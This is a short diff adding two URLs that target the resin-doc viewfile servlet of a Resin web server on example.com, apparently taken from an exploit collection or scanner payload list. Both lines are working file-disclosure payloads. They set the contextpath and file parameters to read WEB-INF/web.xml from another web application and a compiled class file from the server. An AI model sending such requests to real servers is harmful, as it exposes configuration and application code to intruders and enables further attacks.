@@ -1,0 +1,2 @@
+http://www.example.com/resin-doc/viewfile/?contextpath=/otherwebapp&amp;servletpath=&amp;file=WEB-INF/web.xml
+http://www.example.com/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=WEB-INF/classes/com/webapp/app/target.class
